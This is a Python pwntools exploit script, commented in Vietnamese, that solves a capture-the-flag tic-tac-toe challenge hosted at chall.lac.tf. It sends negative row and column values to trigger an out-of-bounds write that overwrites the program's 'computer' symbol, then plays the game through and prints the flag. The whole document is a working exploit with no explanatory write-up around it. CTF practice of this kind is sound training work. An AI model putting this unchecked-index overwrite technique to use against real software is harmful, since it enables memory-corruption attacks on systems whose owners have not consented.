from pwn import *

# p = process('./chall')
p = remote('chall.lac.tf', 30001)

# Payload tính toán từ địa chỉ bộ nhớ thực tế:
# board tại 0x4068, computer tại 0x4051 -> Offset -23
# index = (row-1)*3 + (col-1) = -23
# => row = -6, col = -1
target_row = "-6"
target_col = "-1"

print(f"[*] Sending payload: Row {target_row}, Col {target_col} to overwrite 'computer'...")

# Bước 1: Gửi nước đi hack để biến 'O' thành 'X'
p.sendlineafter(b"Enter row #(1-3): ", target_row.encode())
p.sendlineafter(b"Enter column #(1-3): ", target_col.encode())

# Bước 2: Spam các nước đi hợp lệ để game trôi đi
# Bây giờ máy tính (O) đã bị biến thành (X), nó sẽ tự đánh X để giúp ta thắng
for r in range(1, 4):
    for c in range(1, 4):
        try:
            p.sendlineafter(b"Enter row #(1-3): ", str(r).encode())
            p.sendlineafter(b"Enter column #(1-3): ", str(c).encode())
        except EOFError:
            break

# Bước 3: Nhận cờ
print(p.recvall().decode(errors='ignore'))